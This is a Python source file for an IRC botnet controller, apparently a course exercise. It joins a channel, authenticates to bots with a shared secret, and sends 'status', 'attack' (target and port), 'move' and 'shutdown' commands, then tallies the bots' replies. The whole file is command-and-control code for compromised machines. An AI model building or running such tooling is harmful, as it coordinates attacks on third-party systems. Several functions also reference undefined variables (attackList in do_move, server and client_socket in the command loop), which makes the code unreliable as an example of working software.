import socketserver
import socket
import os
import sys
import asyncio
import string
import random
import select

def sendPrivMSG(target,message):
    client.send(('PRIVMSG ' + target + ' :'+message +'\n').encode('utf-8'))

def do_status(client, args):
    global channel
    global id
    print(channel)
    sendPrivMSG(channel,'status')
    botList = []
    client.settimeout(5)
    while True:
        try:
            data = client.recv(1024).decode('utf-8')
            print("A message from server:", data)
            print('-------------------------------------------------------')
            lines = data.split('\n')
            print(lines)
            print('-------------------------------------------------------')
            for line in lines:
                if line:
                    if 'PRIVMSG controller' + id in line and line[:4] == ':bot':
                        botList.append(line.split(':')[2].strip())
        except socket.timeout:
            break
    print('found '+ str(len(botList))+' bots: ', end='')
    for bot in botList:
        print(bot+', ', end='')
    print()



def do_attack(client, args):
    print("attack", args[1], args[2])
    sendPrivMSG(channel, 'attack '+args[1]+' '+args[2])
    attackList = []
    client.settimeout(5)
    while True:
        try:
            data = client.recv(1024).decode('utf-8')
            print("A message from server:", data)
            print('-------------------------------------------------------')
            lines = data.split('\n')
            print(lines)
            print('-------------------------------------------------------')
            for line in lines:
                if line:
                    if 'PRIVMSG controller' + id in line and line[:4] == ':bot':
                        attackList.append(line.split(':',2)[2].strip())
        except socket.timeout:
            break
    success = 0
    fail = 0
    for attack in attackList:
        if 'unsuccessful' in attack:
            fail += 1
        else:
            success += 1
        print(attack)
    print('Total: '+ str(success) + ' successful, '+ str(fail) +' unsuccessful')


def do_move(client, args):
    print("move", args[1], args[2], args[3])
    sendPrivMSG(channel, 'move '+args[1]+' '+args[2]+' '+args[3])
    moveList = []
    client.settimeout(5)
    while True:
        try:
            data = client.recv(1024).decode('utf-8')
            print("A message from server:", data)
            print('-------------------------------------------------------')
            lines = data.split('\n')
            print(lines)
            print('-------------------------------------------------------')
            for line in lines:
                if line:
                    if 'PRIVMSG controller' + id in line and line[:4] == ':bot':
                        attackList.append(line.split(':',2)[2].strip())
        except socket.timeout:
            break
    print('Total: '+ str(len(moveList)) + ' successfully moved')

def do_quit(client, args):
    client.close()

def do_shutdown(client, args):
    print("shutdown the bots")


# Structure so that the program can look into to decide which method to call based on user specified argument
interpretInput = {
    'status':do_status,
    'attack':do_attack,
    'move':do_move,
    'quit':do_quit,
    'shutdown':do_shutdown
}

secret = None
channel = None
id = ''
if __name__ == "__main__":
    HOST = sys.argv[1]
    srcPort = int(sys.argv[2])
    channel = sys.argv[3][1:]
    secret = sys.argv[4]
    
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((HOST,srcPort))
    while True:
        id = ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in range(6))
        print(id)
        client.send(('NICK controller'+id+'\n').encode('utf-8'))
        try:
            print('in try')
            client.settimeout(4)
            data = client.recv(128).decode('utf-8')
            print ('IRC said:', data)
            if not data == 'ERR_NICKNAMEINUSE':
                break
        except socket.timeout:
            break

    client.settimeout(None)
    client.send(('USER controller * * :controller test\n').encode('utf-8'))
    data = client.recv(1024).decode('utf-8')
    print('response: ',data)
    if not '001' in data:
        print('You are not welcome')
        sys.exit()

    client.send(('JOIN '+channel+'\n').encode('utf-8'))
    data = client.recv(1024).decode('utf-8')
    print('response: ', data)
    sendPrivMSG(channel,secret)

    print('going to while')

    while True:
        data = input("Please enter your command:")
        # Interpret user info by matching it with one of the definitions in the variable
        args = data.split()
        if args[0] == "shutdown":
            do_shutdown(server,client_socket,args)
        elif args[0] == "quit":
            do_quit(client_socket,args)
            loggedIn = False
            break
        else:
            if not args[0] in interpretInput:
                print('No such command\n')
            else:
                interpretInput[args[0]](client,args)
                    
    # close clients socket
    client.close()
    # terminate the program
    sys.exit()




